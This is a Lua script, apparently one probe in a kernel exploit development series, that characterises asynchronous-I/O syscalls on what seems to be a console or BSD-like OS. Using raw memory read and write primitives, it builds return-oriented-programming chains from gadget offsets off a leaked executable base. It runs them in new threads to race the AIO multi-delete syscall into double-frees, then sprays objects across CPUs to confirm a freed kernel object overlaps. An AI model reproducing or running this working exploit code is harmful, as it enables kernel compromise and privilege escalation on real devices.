-- CRASH_CLASS: MODERATE
-- PROBE 67m: Characterize 663 status across AIO lifecycle states
--
-- Map 663 return value for: pending (socketpair), completed (/dev/zero),
-- polled, unpolled, and deleted. This tells us what 663 reads from.

print("=== PROBE 67m: 663 CHARACTERIZE ===")

local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return N(v) end return nil end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(a) end) if ok then return v end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function get_hi_lo(val) if type(val)=="table" and val.h then return val.h,val.l end return 0,N(val) end
local function sgn(v) local l=N(v) if l>=0x80000000 then l=l-0x100000000 end return l end
local function put_str(s) local p=memory.alloc(#s+2) for i=1,#s do pcall(function() memory.write_byte(p+i-1,string.byte(s,i)) end) end pcall(function() memory.write_byte(p+#s,0) end) return p end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_aio(fd, nbytes)
    local rb = memory.alloc(8); wd(N(rb), 0xDEAD)
    wq(N(reqs), uint64(1)); wq(N(reqs)+8, uint64(nbytes or 16))
    local bh,bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs)+0x10, bl); wd(N(reqs)+0x14, bh)
    local rh,rl = get_hi_lo(uint64(N(rb)))
    wd(N(reqs)+0x18, rl); wd(N(reqs)+0x1C, rh)
    wd(N(reqs)+0x20, fd); wd(N(reqs)+0x24, 0); wd(N(one_id), 0)
    pcall(function() mk(669)(uint64(1),uint64(N(reqs)),uint64(1),uint64(1),uint64(N(one_id))) end)
    return rd(N(one_id)) or 0, rb
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)),uint64(1),uint64(N(one_st))) end)
end
local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function() mk(662)(uint64(N(one_id)),uint64(1),uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xCD
end
local function check_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    local ret = sgn(mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st))))
    return ret, rd(N(one_st)) or 0xDEADDEAD
end
local function check_666(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    local ret = sgn(mk(666)(uint64(N(one_id)), uint64(1), uint64(N(one_st))))
    return ret, rd(N(one_st)) or 0xDEADDEAD
end

-- =============================================
-- [A] /dev/zero AIO lifecycle
-- =============================================
print("")
print("-- [A] /dev/zero AIO --")
local id_z, rb_z = submit_aio(fd_zero)
print(string.format("  id=0x%X", id_z))

-- Immediate (unpolled, just submitted)
local r663, s663 = check_663(id_z)
local r666, s666 = check_666(id_z)
print(string.format("  immediate:  663 ret=%d st=0x%08X  666 ret=%d st=0x%08X", r663, s663, r666, s666))

-- After poll
poll_one(id_z)
r663, s663 = check_663(id_z)
r666, s666 = check_666(id_z)
print(string.format("  polled:     663 ret=%d st=0x%08X  666 ret=%d st=0x%08X", r663, s663, r666, s666))

-- After delete
delete_one(id_z)
r663, s663 = check_663(id_z)
r666, s666 = check_666(id_z)
print(string.format("  deleted:    663 ret=%d st=0x%08X  666 ret=%d st=0x%08X", r663, s663, r666, s666))

-- =============================================
-- [B] SOCKETPAIR AIO lifecycle (blocking read)
-- =============================================
print("")
print("-- [B] SOCKETPAIR AIO --")
local sp = memory.alloc(16); wd(N(sp), 0xFFFFFFFF); wd(N(sp)+4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
local sp_rd = rd(N(sp)) or -1
local sp_wr = rd(N(sp)+4) or -1
print(string.format("  socketpair: rd=%d wr=%d", sp_rd, sp_wr))

local id_sp, rb_sp = submit_aio(sp_rd)
print(string.format("  id=0x%X", id_sp))

-- Immediate (pending — no data in socketpair)
r663, s663 = check_663(id_sp)
r666, s666 = check_666(id_sp)
print(string.format("  pending:    663 ret=%d st=0x%08X  666 ret=%d st=0x%08X", r663, s663, r666, s666))

-- After poll (still pending)
poll_one(id_sp)
r663, s663 = check_663(id_sp)
r666, s666 = check_666(id_sp)
print(string.format("  poll+pend:  663 ret=%d st=0x%08X  666 ret=%d st=0x%08X", r663, s663, r666, s666))

-- Write to socketpair → triggers completion
local wbuf = memory.alloc(8); wd(N(wbuf), 0x41424344)
pcall(function() mk(4)(uint64(sp_wr), uint64(N(wbuf)), uint64(4)) end)
for w = 1, 100000 do end

r663, s663 = check_663(id_sp)
r666, s666 = check_666(id_sp)
local res = rd(N(rb_sp)) or 0xDEAD
print(string.format("  completed:  663 ret=%d st=0x%08X  666 ret=%d st=0x%08X  result=0x%X", r663, s663, r666, s666, res))

-- Delete
delete_one(id_sp)
r663, s663 = check_663(id_sp)
r666, s666 = check_666(id_sp)
print(string.format("  deleted:    663 ret=%d st=0x%08X  666 ret=%d st=0x%08X", r663, s663, r666, s666))

-- =============================================
-- [C] CLASS COMPARISON
-- =============================================
print("")
print("-- [C] CLASS COMPARISON --")
for cls = 1, 3 do
    local id_c, _ = submit_aio(fd_zero)
    if id_c ~= 0 then
        -- Resubmit with specific class
        wd(N(one_id), 0)
        wq(N(reqs), uint64(1)); wq(N(reqs)+8, uint64(16))
        local bh,bl = get_hi_lo(uint64(N(data_buf)))
        wd(N(reqs)+0x10, bl); wd(N(reqs)+0x14, bh)
        local rh,rl = get_hi_lo(uint64(N(result_buf)))
        wd(N(reqs)+0x18, rl); wd(N(reqs)+0x1C, rh)
        wd(N(reqs)+0x20, fd_zero); wd(N(reqs)+0x24, 0); wd(N(one_id), 0)
        pcall(function() mk(669)(uint64(1),uint64(N(reqs)),uint64(1),uint64(cls),uint64(N(one_id))) end)
        local id2 = rd(N(one_id)) or 0
        if id2 ~= 0 then
            poll_one(id2)
            local r2, s2 = check_663(id2)
            print(string.format("  class=%d: id=0x%X  663 ret=%d st=0x%08X", cls, id2, r2, s2))
            delete_one(id2)
        end
        delete_one(id_c)
    end
end

-- =============================================
-- [D] OVERLAPPING: submit on CPU 0, overwrite on CPU 1, check 663
-- =============================================
print("")
print("-- [D] OVERLAP via CPU spray --")

local pin_buf = memory.alloc(8)
local function set_cpu(mask)
    wq(N(pin_buf), uint64(mask))
    pcall(function() mk(488)(uint64(3),uint64(2),uint64(pid_val),uint64(8),uint64(N(pin_buf))) end)
end

-- First, a QUICK double-free (2 iters, from main thread via 662 race with itself)
-- Actually, we can't race with ourselves. Need child threads.
-- Let's use the SAME proven gated race pattern (abbreviated to 2 iters)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib)+0x108) or 0; local ehi = rd(N(ib)+0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa)+8, 0); wq(uint64(N(sa)+16), uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local BATCH = 16
local del_ids = memory.alloc(4*BATCH+0x10)
local states_A = memory.alloc(4*BATCH+0x10)
local states_B = memory.alloc(4*BATCH+0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local tmp_A = memory.alloc(8)
local tmp_B = memory.alloc(8)
local wbyte2 = memory.alloc(8); wd(N(wbyte2), 0x42)

local sp_gA = memory.alloc(16); wd(N(sp_gA), 0xFFFFFFFF); wd(N(sp_gA)+4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_gA))) end)
local gra = rd(N(sp_gA)) or -1; local gwa = rd(N(sp_gA)+4) or -1

local sp_gB = memory.alloc(16); wd(N(sp_gB), 0xFFFFFFFF); wd(N(sp_gB)+4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_gB))) end)
local grb = rd(N(sp_gB)) or -1; local gwb = rd(N(sp_gB)+4) or -1

if gra < 0 or grb < 0 then print("gate fail"); print("=== 67m DONE ==="); return end

local stk_A = memory.alloc(0x4000)
local stk_B = memory.alloc(0x4000)
local total_doubles = 0

for iter = 1, 3 do
    local ids = {}
    for i = 1, BATCH do
        local id = submit_aio(fd_zero, 16)
        if id ~= 0 then poll_one(id); ids[#ids+1] = id end
    end
    if #ids < BATCH then break end

    for i = 0, BATCH-1 do
        wd(N(del_ids)+i*4, ids[i+1])
        wd(N(states_A)+i*4, 0xAA)
        wd(N(states_B)+i*4, 0xBB)
    end
    wq(N(marker_A), uint64(0)); wq(N(marker_B), uint64(0))

    local sb_a = N(stk_A)
    for i = 0, 0x1FFC, 4 do wd(sb_a+i, 0) end
    local sp_a = sb_a + 0x2000 - ((sb_a+0x2000)%16) - 8
    local oa = 0
    local function wa(v) wq(sp_a+oa, v); oa = oa+8 end
    wa(g_pop_rax); wa(uint64(0x41414141))
    wa(g_pop_rdi); wa(uint64(N(marker_A))); wa(g_mov_m_rax)
    wa(g_pop_rax); wa(uint64(3))
    wa(g_pop_rdi); wa(uint64(gra))
    wa(g_pop_rsi); wa(uint64(N(tmp_A)))
    wa(g_pop_rdx); wa(uint64(1)); wa(stub)
    wa(g_pop_rdi); wa(uint64(N(del_ids)))
    wa(g_pop_rsi); wa(uint64(BATCH))
    wa(g_pop_rdx); wa(uint64(N(states_A)))
    wa(g_pop_rax); wa(uint64(662)); wa(stub)
    wa(g_pop_rdi); wa(uint64(0))
    wa(g_pop_rax); wa(uint64(431)); wa(stub)

    local sb_b = N(stk_B)
    for i = 0, 0x1FFC, 4 do wd(sb_b+i, 0) end
    local sp_b = sb_b + 0x2000 - ((sb_b+0x2000)%16) - 8
    local ob = 0
    local function wb(v) wq(sp_b+ob, v); ob = ob+8 end
    wb(g_pop_rax); wb(uint64(0x42424242))
    wb(g_pop_rdi); wb(uint64(N(marker_B))); wb(g_mov_m_rax)
    wb(g_pop_rax); wb(uint64(3))
    wb(g_pop_rdi); wb(uint64(grb))
    wb(g_pop_rsi); wb(uint64(N(tmp_B)))
    wb(g_pop_rdx); wb(uint64(1)); wb(stub)
    wb(g_pop_rdi); wb(uint64(N(del_ids)))
    wb(g_pop_rsi); wb(uint64(BATCH))
    wb(g_pop_rdx); wb(uint64(N(states_B)))
    wb(g_pop_rax); wb(uint64(662)); wb(stub)
    wb(g_pop_rdi); wb(uint64(0))
    wb(g_pop_rax); wb(uint64(431)); wb(stub)

    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa)+i, 0) end
    wq(N(pa), g_bare_ret)
    wq(N(pa)+0x10, uint64(sb_a))
    wq(N(pa)+0x18, uint64(0x2000))

    local pb = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pb)+i, 0) end
    wq(N(pb), g_bare_ret)
    wq(N(pb)+0x10, uint64(sb_b))
    wq(N(pb)+0x18, uint64(0x2000))

    pcall(function() mk(455)(pa, uint64(0x38)) end)
    pcall(function() mk(455)(pb, uint64(0x38)) end)

    local a2, b2 = false, false
    for w = 1, 500000 do
        if not a2 and N(rq(N(marker_A)) or uint64(0)) ~= 0 then a2 = true end
        if not b2 and N(rq(N(marker_B)) or uint64(0)) ~= 0 then b2 = true end
        if a2 and b2 then break end
    end
    if not (a2 and b2) then print("MARKER TIMEOUT iter " .. iter); break end

    for d = 1, 500 do end
    pcall(function() mk(4)(uint64(gwa), uint64(N(wbyte2)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gwb), uint64(N(wbyte2)), uint64(1)) end)
    for w = 1, 100000 do end

    local doubles = 0
    for i = 0, BATCH-1 do
        local sA = rd(N(states_A)+i*4) or 0xAA
        local sB = rd(N(states_B)+i*4) or 0xBB
        if sA == 0 and sB == 0 then doubles = doubles+1 end
    end
    total_doubles = total_doubles + doubles
    print(string.format("  race iter %d: %d doubles", iter, doubles))
end

print("  total_doubles=" .. total_doubles)

if total_doubles < 1 then
    print("SKIP overlap test")
    print("=== 67m DONE ===")
    return
end

-- Now spray: CPU 0 gets /dev/zero AIO (completed), CPU 1 gets socketpair AIO (pending)
-- If they overlap, 663 on CPU 0's IDs should show "pending" status

-- Create 16 socketpairs for pending AIO
local sp_pend = {}
for i = 1, 16 do
    local s = memory.alloc(16); wd(N(s), -1); wd(N(s)+4, -1)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(s))) end)
    local r = rd(N(s)) or -1; local w = rd(N(s)+4) or -1
    if r > 0 and w > 0 then sp_pend[#sp_pend+1] = {r=r, w=w} end
end
print(string.format("  pending socketpairs: %d", #sp_pend))

-- CPU 0: submit 40 AIO on /dev/zero (completed state)
set_cpu(1)
local set_X = {}
for i = 1, 40 do
    local id = submit_aio(fd_zero)
    if id ~= 0 then poll_one(id); set_X[#set_X+1] = id end
end
print(string.format("  set_X (cpu0, /dev/zero): %d", #set_X))

-- Record 663 for set X
local x_663_before = {}
for i = 1, #set_X do
    local r, s = check_663(set_X[i])
    x_663_before[i] = {ret=r, st=s}
end

-- CPU 1: submit 16 AIO on socketpair (pending state)
set_cpu(2)
local set_Y = {}
for i = 1, #sp_pend do
    local id = submit_aio(sp_pend[i].r)
    if id ~= 0 then set_Y[#set_Y+1] = id end
end
print(string.format("  set_Y (cpu1, socketpair): %d", #set_Y))

-- Also submit 24 more on /dev/zero from CPU 1 to consume more of the free list
for i = 1, 24 do
    local id = submit_aio(fd_zero)
    if id ~= 0 then poll_one(id); set_Y[#set_Y+1] = id end
end

set_cpu(0x7F)

-- Re-check 663 for set X
local changed = 0
local details = {}
for i = 1, #set_X do
    local r, s = check_663(set_X[i])
    if s ~= x_663_before[i].st then
        changed = changed + 1
        if #details < 10 then
            details[#details+1] = string.format("  X[%d] id=0x%X: 0x%08X -> 0x%08X",
                i, set_X[i], x_663_before[i].st, s)
        end
    end
end
print(string.format("  663 changed: %d/%d", changed, #set_X))
for _, s in ipairs(details) do print(s) end

if changed > 0 then
    print("  *** 663 READS FROM TRACKING OBJECT — OVERLAP CONFIRMED ***")
else
    print("  663 unchanged — reads from ID table (not tracking) or no overlap")
end

-- Cleanup: poll and delete set Y
for i = 1, #set_Y do poll_one(set_Y[i]) end
-- Write to pending socketpairs to complete them
for i = 1, #sp_pend do
    pcall(function() mk(4)(uint64(sp_pend[i].w), uint64(N(wbuf)), uint64(1)) end)
end
for w = 1, 50000 do end
for i = 1, #set_Y do delete_one(set_Y[i]) end
for i = 1, #set_X do delete_one(set_X[i]) end

print("")
print("=== 67m DONE ===")
